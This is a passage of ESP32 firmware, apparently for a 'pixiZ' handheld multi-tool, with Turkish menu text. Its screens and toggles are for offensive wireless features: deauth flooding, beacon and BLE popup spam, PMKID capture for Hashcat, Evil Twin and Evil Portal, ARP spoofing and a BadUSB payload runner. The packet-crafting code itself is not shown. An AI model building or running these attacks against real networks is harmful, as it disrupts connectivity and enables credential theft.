  tft.setCursor(8, 30); tft.print("IR aliciya kumandayi");
  tft.setCursor(8, 44); tft.print("tutup bir tusa basin.");
  if (irRawSt == 0) {
    tft.fillRoundRect(44, 98, 72, 16, 3, ST77XX_RED);
    tft.setTextColor(ST77XX_WHITE); tft.setCursor(52, 101); tft.print("BEKLIYOR");
    irRawSt = -1;
  } else {
    tft.fillRoundRect(44, 98, 72, 16, 3, ST77XX_GREEN);
    tft.setTextColor(ST77XX_WHITE); tft.setCursor(60, 101); tft.print("TAMAM");
  }
  ftr("MENU=Cikis");
}
void actIRRaw() {
  if (menu()) { irRawMode = false; irRawSt = 0; pg=30; drawIRToolsMenu(); }
}
void drawTVBGone() {
  pg=31; hdr("TV-B-GONE", ST77XX_RED);
  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(8, 30); tft.print("Onceden kayitli 14+");
  tft.setCursor(8, 44); tft.print("TV kapama kodu 5 kez");
  tft.setCursor(8, 58); tft.print("gonderilecek.");
  tft.setTextColor(tvbgRunning ? ST77XX_GREEN : ST77XX_WHITE);
  tft.setCursor(8, 78); tft.print(tvbgRunning ? "CALISIYOR..." : "OK=Baslat");
  ftr("MENU=Cikis  OK=Start/Stop");
}
void actTVBGone() {
  if (menu()) { tvbgRunning = false; pg=30; drawIRToolsMenu(); }
  else if (ok()) {
    tvbgRunning = !tvbgRunning;
    if (tvbgRunning) {
      tft.fillRect(0, 76, 160, 16, ST77XX_BLACK);
      tft.setTextColor(ST77XX_GREEN); tft.setCursor(8, 78); tft.print("CALISIYOR...");
    } else {
      tft.fillRect(0, 76, 160, 16, ST77XX_BLACK);
      tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 78); tft.print("OK=Baslat");
    }
  }
}

// ═══════════════════════════════════════════════════
//  BT MODULE (mevcut)
// ═══════════════════════════════════════════════════

void drawBT() {
  pg=5; hdr("BLUETOOTH KB", ST77XX_MAGENTA);
  tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 32); tft.print("Status: ");
#if ENABLE_BT
  bool okk = bleKeyboard.isConnected();
  tft.setTextColor(okk ? ST77XX_GREEN : ST77XX_YELLOW);
  tft.print(okk ? "BAGLI" : "BEKLIYOR...");
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(8, 52); tft.print("Cihaz: pixiZ Remote");
  tft.setTextColor(ST77XX_GREY);
  tft.setCursor(8, 72); tft.print("Telefon/pc Bluetooth");
  tft.setCursor(8, 86); tft.print("ayarlarindan esle.");
#else
  tft.setTextColor(ST77XX_GREY); tft.print("KAPALI");
#endif
  ftr("MENU=Geri");
}
void actBT() { if (menu()) { pg=0; drawMain(); } }

// ═══════════════════════════════════════════════════
//  WIFI MODULE (mevcut)
// ═══════════════════════════════════════════════════

void drawWiFi() {
  pg=6; hdr("WIFI TOOLS", ST77XX_CYAN);
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(8, 30); tft.print("[1] Ag Tara");
  tft.setCursor(8, 50); tft.print("[2] Ag Bilgisi");
  tft.setCursor(8, 70); tft.print("[3] QR Kod Olustur");
  tft.setCursor(8, 90); tft.print("[4] Paket Monit");
  tft.setTextColor(ST77XX_GREY);
  tft.setCursor(8, 110); tft.print("WiFi: ");
  if (WiFi.status() == WL_CONNECTED) {
    tft.setTextColor(ST77XX_GREEN); tft.print("Bagli");
  } else {
    tft.setTextColor(ST77XX_RED); tft.print("Bagli Degil");
  }
  ftr("MENU=Geri  OK=Sec");
}
void drawWiFiScan() {
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 160, 20, ST77XX_CYAN);
  tft.drawFastHLine(0, 20, 160, 0x3A9F);
  tft.setTextSize(1); tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(44, 5); tft.print("WIFI SCAN");
  if (wifiScanning) {
    tft.setTextColor(ST77XX_YELLOW);
    tft.setCursor(8, 50); tft.print("Taniyor...");
    return;
  }
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(8, 30); tft.printf("Bulunan: %d ag", wifiN);
  for (int i = 0; i < wifiN && i < 4; i++) {
    tft.setTextColor(ST77XX_WHITE);
    tft.setCursor(8, 46+i*18); tft.print(wifiSSIDs[i]);
  }
  ftr("MENU=Geri");
}
void doWiFiScan() {
  wifiN = 0;
  wifiScanning = true;
  drawWiFiScan();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  int n = WiFi.scanNetworks();
  if (n > 10) n = 10;
  wifiN = n;
  for (int i = 0; i < n; i++) {
    strncpy(wifiSSIDs[i], WiFi.SSID(i).c_str(), 32);
    wifiSSIDs[i][32] = 0;
  }
  WiFi.scanDelete();
  wifiScanning = false;
  drawWiFiScan();
}
int wifiSel = 0;

void actWiFi() {
  if (menu()) { pg=0; drawMain(); }
  else if (ok()) {
    switch (wifiSel) {
      case 0: doWiFiScan(); break;
      case 1: // Ag Bilgisi
        tft.fillScreen(ST77XX_BLACK);
        tft.fillRect(0,0,160,20,ST77XX_CYAN);
        tft.drawFastHLine(0,20,160,0x3A9F);
        tft.setTextSize(1); tft.setTextColor(ST77XX_WHITE);
        tft.setCursor(20,5); tft.print("AG BILGISI");
        tft.setTextColor(ST77XX_GREY); tft.setCursor(8,30);
        tft.print("SSID: "); tft.setTextColor(ST77XX_WHITE);
        tft.print(WiFi.SSID());
        tft.setCursor(8,48); tft.setTextColor(ST77XX_GREY);
        tft.print("IP: "); tft.setTextColor(ST77XX_WHITE);
        tft.print(WiFi.localIP().toString());
        tft.setCursor(8,66); tft.setTextColor(ST77XX_GREY);
        tft.print("GW: "); tft.setTextColor(ST77XX_WHITE);
        tft.print(WiFi.gatewayIP().toString());
        tft.setCursor(8,84); tft.setTextColor(ST77XX_GREY);
        tft.print("RSSI: "); tft.setTextColor(ST77XX_WHITE);
        tft.printf("%d dBm", WiFi.RSSI());
        tft.setCursor(8,102); tft.setTextColor(ST77XX_GREY);
        tft.print("MAC: "); tft.setTextColor(ST77XX_WHITE);
        tft.print(WiFi.macAddress());
        ftr("MENU=Geri");
        pg = 60; break;
      case 2: // QR Kod
        {
          char qrBuf[128] = {0};
          if (WiFi.status() == WL_CONNECTED) {
            snprintf(qrBuf, 127, "WIFI:S:%s;T:WPA;P:%s;;", WiFi.SSID().c_str(), "");
          } else {
            snprintf(qrBuf, 127, "pixiZ v4 Multi-Tool");
          }
          strcpy(qrText, qrBuf);
          drawQR(qrText);
        }
        break;
    }
  }
  else if (up()) { wifiSel = (wifiSel+3)%4; drawWiFi(); }
  else if (down()) { wifiSel = (wifiSel+1)%4; drawWiFi(); }
}

// ═══════════════════════════════════════════════════
//  HACK TOOLS MENU
// ═══════════════════════════════════════════════════

#if ENABLE_HACK
const char* hkm[] = {
  "Beacon Spam",
  "Deauth Flood",
  "Deauth Detector",
  "PMKID Capture",
  "Probe Sniffer",
  "Evil Twin",
  "Beacon Sniff",
  "Port Scanner",
  "RAW Sniffer",
  "Evil Portal",
  "AirTag Sniff",
  "ESP-NOW",
  "ARP Spoofing"
};
const int HKC = sizeof(hkm)/sizeof(hkm[0]);

int hackScroll = 0;

void drawHackMenu() {
  pg=12; hdr("HACK TOOLS", ST77XX_RED);
  if (sel2 < hackScroll) hackScroll = sel2;
  if (sel2 >= hackScroll + 5) hackScroll = sel2 - 4;
  if (hackScroll < 0) hackScroll = 0;
  if (hackScroll > HKC - 5) hackScroll = HKC - 5;
  if (hackScroll < 0) hackScroll = 0;

  for (int i = hackScroll; i < hackScroll+5 && i < HKC; i++) {
    int idx = i - hackScroll;
    int y = 26 + idx*18;
    bool s = i==sel2;
    tft.fillRect(2, y, 156, 16, s ? ST77XX_RED : ST77XX_BLACK);
    if (s) tft.drawRoundRect(2, y, 156, 16, 3, ST77XX_RED);
    tft.setTextColor(s ? ST77XX_BLACK : ST77XX_WHITE);
    tft.setCursor(6, y+3); tft.print(hkm[i]);
    bool act = false;
    switch (i) {
      case 0: act = beaconRunning; break;
      case 1: act = deauthRunning; break;
      case 2: act = deauthDetect; break;
      case 3: act = pmkidRunning; break;
      case 4: act = probeSniff; break;
      case 5: act = evilTwinActive; break;
      case 8: act = rawSniffRunning; break;
      case 9: act = portalRunning; break;
      case 10: act = airtagRunning; break;
      case 11: act = espnowInit; break;
      case 12: act = arpRunning; break;
    }
    if (act) {
      tft.setTextColor(ST77XX_GREEN); tft.setCursor(136, y+3); tft.print("ON");
    }
  }
  ftr("OK=Sec  MENU=Geri");
}

void drawBeaconScreen() {
  pg=13; hdr("BEACON SPAM", ST77XX_RED);
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(8, 30); tft.print("Durum: ");
  tft.setTextColor(beaconRunning ? ST77XX_GREEN : ST77XX_YELLOW);
  tft.print(beaconRunning ? "CALISIYOR" : "DURDU");
  tft.setCursor(8, 48); tft.setTextColor(ST77XX_WHITE);
  tft.printf("Gonderilen: %d", beaconCount);
  tft.setCursor(8, 64); tft.setTextColor(ST77XX_GREY);
  tft.print("100+ sahte WiFi agi basar.");
  tft.setCursor(8, 78);
  tft.print("Telefonlarin WiFi listesi");
  tft.setCursor(8, 92);
  tft.print("spam olur.");
  ftr("OK=Ac/Kapat  MENU=Cikis");
}

void drawDeauthScreen() {
  pg=15; hdr("DEAUTH FLOOD", ST77XX_RED);
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(8, 30); tft.print("Durum: ");
  tft.setTextColor(deauthRunning ? ST77XX_GREEN : ST77XX_YELLOW);
  tft.print(deauthRunning ? "SALDIRIYOR" : "HAZIR");
  tft.setCursor(8, 48); tft.setTextColor(ST77XX_WHITE);
  tft.printf("Gonderilen: %d", deauthCount);
  tft.setCursor(8, 64); tft.setTextColor(ST77XX_GREY);
  tft.print("Hedef MAC: ");
  tft.setTextColor(ST77XX_WHITE);
  tft.print(deauthTarget);
  tft.setCursor(8, 82); tft.setTextColor(ST77XX_GREY);
  tft.print("Hedef ariyeteki herkesin");
  tft.setCursor(8, 96);
  tft.print("baglantisi kopar.");
  ftr("OK=Ac/Kapat  UP=Hedef  MENU=Cikis");
}

void drawDeauthDetScreen() {
  pg=16; hdr("DEAUTH DETECTOR", ST77XX_CYAN);
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(8, 30); tft.print("Durum: ");
  tft.setTextColor(deauthDetect ? ST77XX_GREEN : ST77XX_YELLOW);
  tft.print(deauthDetect ? "IZLIYOR" : "KAPALI");
  tft.setCursor(8, 48); tft.setTextColor(ST77XX_WHITE);
  tft.printf("Tespit: %d deauth", deauthCount);
  tft.setCursor(8, 64); tft.setTextColor(ST77XX_GREY);
  tft.print("Cevrede deauth paketi");
  tft.setCursor(8, 78);
  tft.print("gonderilirse uyarir.");
  tft.setCursor(8, 92);
  tft.print("Savunma amacli.");
  ftr("OK=Ac/Kapat  MENU=Cikis");
}

void drawPMKIDScreen() {
  pg=17; hdr("PMKID CAPTURE", ST77XX_RED);
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(8, 30); tft.print("Durum: ");
  tft.setTextColor(pmkidRunning ? ST77XX_GREEN : ST77XX_YELLOW);
  tft.print(pmkidRunning ? "YAKALIYOR" : "KAPALI");
  tft.setCursor(8, 48); tft.setTextColor(ST77XX_WHITE);
  tft.printf("EAPOL: %d", pmkidCount);
  tft.setCursor(8, 64); tft.setTextColor(ST77XX_GREY);
  tft.print("WPA2/WPA3 el sikismasini");
  tft.setCursor(8, 78);
  tft.print("yakala, sonra Hashcat");
  tft.setCursor(8, 92);
  tft.print("ile kir. (Serial'dan dok)");
  ftr("OK=Ac/Kapat  MENU=Cikis");
}

void drawProbeScreen() {
  pg=18; hdr("PROBE SNIFFER", ST77XX_CYAN);
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(8, 30); tft.print("Durum: ");
  tft.setTextColor(probeSniff ? ST77XX_GREEN : ST77XX_YELLOW);
  tft.print(probeSniff ? "IZLIYOR" : "KAPALI");
  tft.setCursor(8, 48); tft.setTextColor(ST77XX_WHITE);
  tft.printf("Probe: %d", probeCount);
  tft.setCursor(8, 64); tft.setTextColor(ST77XX_GREY);
  tft.print("Cihazlarin aradigi");
  tft.setCursor(8, 78);
  tft.print("SSID'leri gor. Hangi");
  tft.setCursor(8, 92);
  tft.print("kafe/otel/ev gosterir.");
  ftr("OK=Ac/Kapat  MENU=Cikis");
}

void drawHackAttack(int a) {
  switch (a) {
    case 0: drawBeaconScreen(); break;
    case 1: drawDeauthScreen(); break;
    case 2: drawDeauthDetScreen(); break;
    case 3: drawPMKIDScreen(); break;
    case 4: drawProbeScreen(); break;
  }
}

void toggleHack(int a) {
  switch (a) {
    case 0: // Beacon Spam
      beaconRunning = !beaconRunning;
      if (beaconRunning) {
        WiFi.mode(WIFI_MODE_NULL);
        delay(100);
        startPromiscuous();
        beaconCount = 0;
      } else {
        beaconRunning = false;
        stopPromiscuous();
      }
      drawHackAttack(0);
      break;
    case 1: // Deauth Flood
      deauthRunning = !deauthRunning;
      if (deauthRunning) {
        WiFi.mode(WIFI_MODE_NULL);
        delay(100);
        startPromiscuous();
        deauthCount = 0;
      } else {
        deauthRunning = false;
        stopPromiscuous();
      }
      drawHackAttack(1);
      break;
    case 2: // Deauth Detector
      deauthDetect = !deauthDetect;
      if (deauthDetect) {
        WiFi.mode(WIFI_MODE_NULL);
        delay(100);
        startPromiscuous();
        deauthCount = 0;
      } else {
        deauthDetect = false;
        stopPromiscuous();
      }
      drawHackAttack(2);
      break;
    case 3: // PMKID
      pmkidRunning = !pmkidRunning;
      if (pmkidRunning) {
        WiFi.mode(WIFI_MODE_NULL);
        delay(100);
        startPromiscuous();
        pmkidCount = 0;
      } else {
        pmkidRunning = false;
        stopPromiscuous();
      }
      drawHackAttack(3);
      break;
    case 4: // Probe Sniff
      probeSniff = !probeSniff;
      if (probeSniff) {
        WiFi.mode(WIFI_MODE_NULL);
        delay(100);
        startPromiscuous();
        probeCount = 0;
      } else {
        probeSniff = false;
        stopPromiscuous();
      }
      drawHackAttack(4);
      break;
  }
}

void actHackMenu() {
  if (menu()) { stopPromiscuous(); pg=0; drawMain(); }
  else if (ok()) {
    if (sel2 < 5) toggleHack(sel2);
    else if (sel2 == 5) { sel2=0; drawEvilScan(); }
    else if (sel2 == 6) { drawBeaconSniff(); }
    else if (sel2 == 7) { drawPortScan(); }
    else if (sel2 == 8) { toggleRawSniff(); }
    else if (sel2 == 9) { drawEvilPortal(); }
    else if (sel2 == 10) { drawAirTagSniff(); }
    else if (sel2 == 11) { pg=44; drawESPNOW(); }
    else if (sel2 == 12) { toggleARPSpoof(); }
  }
  else if (up()) { int o=sel2; if (sel2>0) sel2--; drawHackMenu(); }
  else if (down()) { int o=sel2; if (sel2<HKC-1) sel2++; drawHackMenu(); }
}
#endif

// ═══════════════════════════════════════════════════
//  BLE TOOLS MENU
// ═══════════════════════════════════════════════════

#if ENABLE_BLESPAM || ENABLE_BLESCAN

const char* blm[] = {
#if ENABLE_BLESCAN
  "BLE Scanner",
#endif
#if ENABLE_BLESPAM
  "Spam iOS",
  "Spam Samsung",
  "Spam Windows",
  "Spam Android",
  "Spam ALL",
#endif
};
const int BLC = sizeof(blm)/sizeof(blm[0]);

void drawBLEMenu() {
  pg=22; hdr("BLE TOOLS", ST77XX_MAGENTA);
  for (int i = 0; i < BLC && i < 5; i++) {
    int y = 26+i*18; bool s = i==sel2;
    tft.fillRect(2, y, 156, 16, s ? ST77XX_MAGENTA : ST77XX_BLACK);
    if (s) tft.drawRoundRect(2, y, 156, 16, 3, ST77XX_MAGENTA);
    tft.setTextColor(s ? ST77XX_BLACK : ST77XX_WHITE);
    tft.setCursor(6, y+3); tft.print(blm[i]);
    if (bleSpamRunning && i >= 1 && i-1 == bleSpamType) {
      tft.setTextColor(ST77XX_GREEN); tft.setCursor(136, y+3); tft.print("ON");
    }
  }
  ftr("OK=Ac/Kapat  MENU=Geri");
}

void drawBLEScanner() {
  pg=23; hdr("BLE SCANNER", ST77XX_MAGENTA);
  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(8, 40); tft.print("BLE tarama baslat?");
  tft.setCursor(8, 58); tft.print("Cevredeki tum BLE");
  tft.setCursor(8, 72); tft.print("cihazlari listeler.");
  ftr("OK=Baslat  MENU=Cikis");
}

void drawBLESpam(int type) {
  int pgs[] = {24,25,26,27,28};
  pg = pgs[type];
  const char* names[] = {"iOS SPAM", "SAMSUNG SPAM", "WINDOWS SPAM", "ANDROID SPAM", "SPAM ALL"};
  uint16_t cols[] = {ST77XX_CYAN, ST77XX_MAGENTA, ST77XX_CYAN, ST77XX_GREEN, ST77XX_RED};
  hdr(names[type], cols[type]);
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(8, 30); tft.print("Durum: ");
  tft.setTextColor(bleSpamRunning ? ST77XX_GREEN : ST77XX_YELLOW);
  tft.print(bleSpamRunning ? "SPAMLIYOR" : "KAPALI");
  tft.setCursor(8, 50); tft.setTextColor(ST77XX_WHITE);
  tft.print("Tip: "); tft.print(names[type]);
  tft.setCursor(8, 68); tft.setTextColor(ST77XX_GREY);
  tft.print("Telefonlara sahte BLE");
  tft.setCursor(8, 82);
  tft.print("bildirimleri gonderir.");
  tft.setCursor(8, 96);
  tft.print("Popup'lar acilir.");
  ftr("OK=Ac/Kapat  MENU=Cikis");
}

void actBLEMenu() {
  if (menu()) { bleSpamStop(); pg=0; drawMain(); }
  else if (ok()) {
#if ENABLE_BLESCAN
    if (sel2 == 0) { pg=23; drawBLEScanner(); }
#endif
#if ENABLE_BLESPAM
    else {
      int type = sel2 - (ENABLE_BLESCAN ? 1 : 0);
      if (!bleSpamRunning) {
        bleSpamStart(type);
      } else {
        bleSpamStop();
      }
      drawBLESpam(type);
    }
#endif
  }
  else if (up()) { if (sel2>0) sel2--; drawBLEMenu(); }
  else if (down()) { if (sel2<BLC-1) sel2++; drawBLEMenu(); }
}
#endif

// ═══════════════════════════════════════════════════
//  BADUSB MENU
// ═══════════════════════════════════════════════════

#if ENABLE_BADUSB
void drawBadUSBMenu() {
  pg=33; hdr("BADUSB", ST77XX_RED);
  if (pldN == 0) {
    tft.setTextColor(ST77XX_GREY);
    tft.setCursor(8, 50); tft.print("Henuz payload yok.");
    tft.setCursor(8, 66); tft.print("BT klavye baglaninca");
    tft.setCursor(8, 82); tft.print("calistirmak icin OK.");
    ftr("MENU=Geri  OK=Hazir");
    return;
  }
  for (int i = 0; i < pldN && i < 5; i++) {
    int y = 24+i*19; bool s = i==sel2;
    tft.fillRect(2, y, 156, 17, s ? ST77XX_RED : ST77XX_BLACK);
    if (s) tft.drawRoundRect(2, y, 156, 17, 3, ST77XX_RED);
    tft.setTextColor(s ? ST77XX_BLACK : ST77XX_WHITE);
    tft.setCursor(6, y+4); tft.print(plds[i].name);
  }
  ftr("OK=Calistir  MENU=Geri");
}

void drawBadUSBRun() {
  pg=34; hdr("BADUSB CALISIYOR", ST77XX_RED);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(8, 40); tft.print("Payload calisiyor...");
  tft.setCursor(8, 60); tft.setTextColor(ST77XX_GREY);
  tft.print("Tus vuruslari gonderiliyor.");
  tft.setCursor(8, 80); tft.print("Durdurmak icin MENU.");
  ftr("MENU=Durdur");
}

void actBadUSB() {
  if (pg == 33) {
    if (menu()) { pg=0; drawMain(); }
    else if (ok()) {
      if (pldN > 0) {
        pg=34; drawBadUSBRun();
        badUsbRun(plds[sel2].script);
        pg=33; drawBadUSBMenu();
      }
    }
    else if (up()) { if (sel2>0) sel2--; drawBadUSBMenu(); }
    else if (down()) { if (sel2<pldN-1) sel2++; drawBadUSBMenu(); }
  } else if (pg == 34) {
    if (menu()) { pldRunning = false; pg=33; drawBadUSBMenu(); }
  }
}
#endif

// ═══════════════════════════════════════════════════
//  IR TOOLS MENU
// ═══════════════════════════════════════════════════

const char* irm[] = {
  "TV-B-Gone",
  "IR RAW Capture"
};
const int IRC = 2;

void drawIRToolsMenu() {
  pg=30; hdr("IR TOOLS", ST77XX_RED);
  for (int i = 0; i < IRC; i++) mi(i, IRC, 28, 28, ST77XX_RED, sel2, irm[i]);
  ftr("OK=Sec  MENU=Geri");
}

void actIRToolsMenu() {
  if (menu()) {
    if (tvbgRunning) tvbgRunning = false;
    if (irRawMode) { irRawMode = false; irRawSt = 0; }
    pg=0; drawMain();
  }
  else if (ok()) {
    if (sel2 == 0) { tvbgRunning = false; tvbgIdx = 0; drawTVBGone(); }
    else if (sel2 == 1) { irRawMode = true; irRawSt = 0; drawIRRaw(); }
  }
  else if (up()) { int o=sel2; sel2=(sel2-1+IRC)%IRC; mi(o,IRC,28,28,ST77XX_RED,sel2,irm[o]); mi(sel2,IRC,28,28,ST77XX_RED,sel2,irm[sel2]); }
  else if (down()) { int o=sel2; sel2=(sel2+1)%IRC; mi(o,IRC,28,28,ST77XX_RED,sel2,irm[o]); mi(sel2,IRC,28,28,ST77XX_RED,sel2,irm[sel2]); }
}

// ═══════════════════════════════════════════════════
//  PASSWORD MANAGER
// ═══════════════════════════════════════════════════

#if ENABLE_PASS
void drawPassList() {
  pg=8; hdr("SIFRELER", ST77XX_CYAN);
  if (passN == 0) {
    tft.setTextColor(ST77XX_GREY);
    tft.setCursor(8, 50); tft.print("Kayitli sifre yok.");
    tft.setCursor(8, 66); tft.print("UP=Yeni ekle");
    ftr("OK=Gor  MENU=Geri"); return;
  }
  // Show up to 5 with "+ Ekle" button
  int disp = passN + 1;
  int maxDisp = disp > 5 ? 5 : disp;
  for (int i = 0; i < maxDisp; i++) {
    int y = 24+i*19; bool s = i==sel2;
    tft.fillRect(2, y, 156, 17, s ? ST77XX_CYAN : ST77XX_BLACK);
    if (s) tft.drawRoundRect(2, y, 156, 17, 3, ST77XX_CYAN);
    tft.setTextColor(s ? ST77XX_BLACK : ST77XX_WHITE);
    if (i < passN) {
      tft.setCursor(8, y+4); tft.print(passes[i].svc);
    } else {
      tft.setTextColor(s ? ST77XX_BLACK : ST77XX_GREEN);
      tft.setCursor(8, y+4); tft.print("+ Yeni Ekle");
    }
  }
  ftr("OK=Gor  UP=Yeni  MENU=Geri");
}

void drawPassDetail() {
  hdr(passes[sel2].svc, ST77XX_CYAN);
  tft.setTextColor(ST77XX_GREY);
  tft.setCursor(8, 30); tft.print("Kullanici: ");
  tft.setTextColor(ST77XX_WHITE);
  tft.print(passes[sel2].user);
  tft.setCursor(8, 50); tft.setTextColor(ST77XX_GREY);
  tft.print("Sifre: ");
  tft.setTextColor(ST77XX_WHITE);
  tft.print(passes[sel2].pass);
  tft.setCursor(8, 70); tft.setTextColor(ST77XX_GREEN);
  tft.print("OK=BT Gonder  DOWN=Sil");
  tft.setCursor(8, 86); tft.setTextColor(ST77XX_YELLOW);
  tft.print("MENU=Geri");
  pg = 9;
}

void passTypeBT(int idx) {
#if ENABLE_BT
  if (!bleKeyboard.isConnected()) {
    tft.fillRect(0, 68, 160, 20, ST77XX_BLACK);
    tft.setTextColor(ST77XX_RED); tft.setCursor(8, 70);
    tft.print("BT bagli degil!"); delay(1000); drawPassDetail(); return;
  }
  // Type username
  if (strlen(passes[idx].user) > 0) {
    bleKeyboard.print(passes[idx].user); delay(100);
    bleKeyboard.write(KEY_TAB); delay(200);
  }
  // Type password
  bleKeyboard.print(passes[idx].pass); delay(100);
  bleKeyboard.write(KEY_RETURN);
  tft.fillRect(0, 68, 160, 20, ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN); tft.setCursor(8, 70);
  tft.print("Gonderildi!"); delay(800);
  drawPassDetail();
#else
  tft.fillRect(0, 68, 160, 20, ST77XX_BLACK);
  tft.setTextColor(ST77XX_RED); tft.setCursor(8, 70);
  tft.print("BT kapali!"); delay(800); drawPassDetail();
#endif
}

void passDelete(int idx) {
  for (int i = idx; i < passN-1; i++) passes[i] = passes[i+1];
  passN--;
  svPass();
  if (sel2 >= passN && passN > 0) sel2 = passN-1;
  drawPassList();
}

int passField = 0; // 0=servis 1=kullanici 2=sifre
int passCharIdx = 0;
char passChars[] = " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/~`";
const int passCharN = sizeof(passChars)-1;

void drawPassAdd() {
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 160, 20, ST77XX_CYAN);
  tft.drawFastHLine(0, 20, 160, 0x3A9F);
  tft.setTextSize(1); tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(32, 5); tft.print("SIFRE EKLE");
  // Field indicator
  tft.setTextColor(ST77XX_GREY);
  tft.setCursor(2, 22); tft.print(passField == 0 ? ">" : " ");
  tft.setCursor(2, 42); tft.print(passField == 1 ? ">" : " ");
  tft.setCursor(2, 62); tft.print(passField == 2 ? ">" : " ");
  // Field values
  tft.setTextColor(ST77XX_GREY); tft.setCursor(10, 22); tft.print("Servis:");
  tft.setTextColor(ST77XX_WHITE); tft.setCursor(10, 30);
  tft.print(passes[passN].svc);
  tft.setTextColor(ST77XX_GREY); tft.setCursor(10, 42); tft.print("Kullanici:");
  tft.setTextColor(ST77XX_WHITE); tft.setCursor(10, 50);
  tft.print(passes[passN].user);
  tft.setTextColor(ST77XX_GREY); tft.setCursor(10, 62); tft.print("Sifre:");
  tft.setTextColor(ST77XX_WHITE); tft.setCursor(10, 70);
  tft.print(passes[passN].pass);
  // Current char
  char* f = passField == 0 ? passes[passN].svc : (passField == 1 ? passes[passN].user : passes[passN].pass);
  int fl = strlen(f);
  tft.fillRect(10+fl*6, 22+passField*20, 6, 8, ST77XX_YELLOW);
  tft.setTextColor(ST77XX_BLACK);
  tft.setCursor(10+fl*6, 22+passField*20); tft.print(f[fl] ? f[fl] : ' ');
  ftr("UP=Harf  DOWN=Secim  OK=Ilk");
}

void actPass() {
  if (pg == 8) {
    if (menu()) { pg=0; drawMain(); }
    else if (up()) {
      if (passN < MAX_PASS && passN < MAX_PASS) {
        memset(&passes[passN], 0, sizeof(PEntry));
        passField = 0; passCharIdx = 0;
        drawPassAdd(); pg = 50;
      } else {
        tft.fillRect(0, 100, 160, 12, ST77XX_BLACK);
        tft.setTextColor(ST77XX_RED); tft.setCursor(8, 104); tft.print("DOLU!"); delay(500);
      }
    }
    else if (ok()) { if (sel2 < passN) drawPassDetail(); }
    else if (down()) {
      if (sel2 < passN) { sel2 = (sel2+1) % (passN+1); drawPassList(); }
    }
  } else if (pg == 9) {
    if (menu()) { pg=8; drawPassList(); }
    else if (ok()) { passTypeBT(sel2); }
    else if (down()) { passDelete(sel2); }
  } else if (pg == 50) {
    if (menu()) { // Save & exit
      if (strlen(passes[passN].svc) > 0) {
        passN++; svPass(); sel2 = passN-1; pg=8; drawPassList();
      } else { pg=8; drawPassList(); }
    }
    else if (ok()) { // Next field
      passField = (passField + 1) % 3;
      passCharIdx = 0;
      drawPassAdd();
    }
    else if (up()) { // Cycle character forward
      char* f = passField == 0 ? passes[passN].svc : (passField == 1 ? passes[passN].user : passes[passN].pass);
      int fl = strlen(f);
      if (fl < MAX_NAME-1) {
        passCharIdx = (passCharIdx + 1) % passCharN;
        f[fl] = passChars[passCharIdx];
        f[fl+1] = 0;
      }
      drawPassAdd();
    }
    else if (down()) { // Cycle character backward
      char* f = passField == 0 ? passes[passN].svc : (passField == 1 ? passes[passN].user : passes[passN].pass);
      int fl = strlen(f);
      if (fl > 0) { f[fl-1] = 0; passCharIdx = 0; }
      drawPassAdd();
    }
  }
}
#endif

// ═══════════════════════════════════════════════════
//  TOOLS
// ═══════════════════════════════════════════════════

const char* tl[] = { "Hakkimizda", "IR Verilerini Temizle", "Yeniden Baslat" };
const int TLC = 3;

void drawTools() {
  pg=10; hdr("ARACLAR", ST77XX_CYAN);
  for (int i = 0; i < TLC; i++) mi(i, TLC, 28, 28, ST77XX_CYAN, sel3, tl[i]);
  ftr("OK=Sec  MENU=Geri");
}
void toolsUp() { int o=sel3; sel3=(sel3-1+TLC)%TLC; mi(o,TLC,28,28,ST77XX_CYAN,sel3,tl[o]); mi(sel3,TLC,28,28,ST77XX_CYAN,sel3,tl[sel3]); }
void toolsDown() { int o=sel3; sel3=(sel3+1)%TLC; mi(o,TLC,28,28,ST77XX_CYAN,sel3,tl[o]); mi(sel3,TLC,28,28,ST77XX_CYAN,sel3,tl[sel3]); }
void toolsOk() {
  switch (sel3) {
    case 0:
      hdr("pixiZ v5", ST77XX_BLUE);
      tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 30); tft.print("pixiZ Multi-Tool");
      tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 46); tft.print("Surum 5.0");
      tft.setCursor(8, 62); tft.print("Bruce + Marauder +");
      tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 82); tft.print("IR+BT+WiFi+BLE+QR+Port");
      tft.setCursor(8, 98); tft.print("github.com/azerenes/pixiZ-v1");
      ftr("MENU=Geri"); pg = 11; break;
    case 1:
      clrIR(); tft.setTextColor(ST77XX_GREEN);
      tft.setCursor(8, 80); tft.print("Tum IR verileri silindi!");
      delay(1000); drawTools(); break;
    case 2: ESP.restart(); break;
  }
}

// ═══════════════════════════════════════════════════
//  BACKGROUND LOOPS
// ═══════════════════════════════════════════════════

void loopHackBg() {
  unsigned long now = millis();
  if (deauthAlert) {
    deauthAlert = false;
    if (pg == 14 || pg == 15) {
      tft.fillRect(0, 28, 160, 16, ST77XX_BLACK);
      tft.setTextColor(ST77XX_RED); tft.setCursor(4, 30);
      tft.print("DEAUTH!");
    }
  }
#if ENABLE_HACK
  // Beacon spam
  if (beaconRunning && now - beaconTimer > 100) {
    beaconTimer = now;
